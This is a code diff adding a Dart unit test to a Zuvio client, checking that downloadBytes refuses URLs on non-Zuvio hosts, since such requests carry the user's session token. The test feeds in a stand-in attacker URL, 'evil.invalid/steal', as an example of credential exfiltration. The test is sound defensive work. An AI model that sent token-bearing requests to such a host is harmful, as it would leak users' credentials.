@@ -105,5 +105,21 @@ void main() {
           await client.downloadBytes('${ZuvioClient.baseUrl}not found');
       expect(String.fromCharCodes(bytes), 'not found');
     });
+
+    test('refuses a url pointing at any other host', () async {
+      // This carries the live session's user_id + accessToken as query
+      // params (see proxyDownloadUrl), so it must never be reachable
+      // with a non-Zuvio host — that would fire an authenticated,
+      // token-bearing request at an arbitrary server.
+      final _FakeAdapter adapter = _FakeAdapter();
+      final ZuvioClient client =
+          ZuvioClient(dio: Dio()..httpClientAdapter = adapter);
+      await client.login(email: 'a@nkust.edu.tw', password: 'p');
+
+      await expectLater(
+        client.downloadBytes('https://evil.invalid/steal?u=1&t=2'),
+        throwsA(isA<ZuvioException>()),
+      );
+    });
   });
 }
